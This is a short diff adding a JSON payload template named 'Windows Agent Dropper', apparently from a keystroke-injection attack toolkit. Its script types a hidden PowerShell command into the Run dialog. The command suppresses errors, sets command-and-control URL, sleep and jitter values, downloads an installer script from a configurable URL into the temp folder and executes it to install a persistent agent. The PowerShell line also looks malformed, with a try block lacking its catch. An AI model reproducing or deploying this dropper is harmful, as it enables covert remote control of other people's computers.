@@ -1,0 +1,7 @@
+{
+  "name": "Windows Agent Dropper (Signed PS Template)",
+  "category": "Persistence",
+  "os": "Windows",
+  "description": "Runs a signed PowerShell installer script with AllSigned policy. Requires you host a code-signed PS1 that downloads/installs the agent. Set: SIGNED_PS_URL, C2_URL, JITTER, SLEEP, PROXY",
+  "script": "REM Windows Agent Dropper using signed PowerShell script\nGUI r\nDELAY 400\nSTRING powershell -w hidden -ExecutionPolicy AllSigned -c \"$ErrorActionPreference='SilentlyContinue';$env:DB_C2='${C2_URL}';$env:DB_SLEEP='${SLEEP:=60}';$env:DB_JITTER='${JITTER:=30}';if('${PROXY}' -ne ''){$env:DB_PROXY='${PROXY}'};$u='${SIGNED_PS_URL}';$ps=$env:TEMP+'\\db-installer.ps1';try{iwr $u -UseBasicParsing -OutFile $ps;}& $ps\"\nENTER\n"
+}
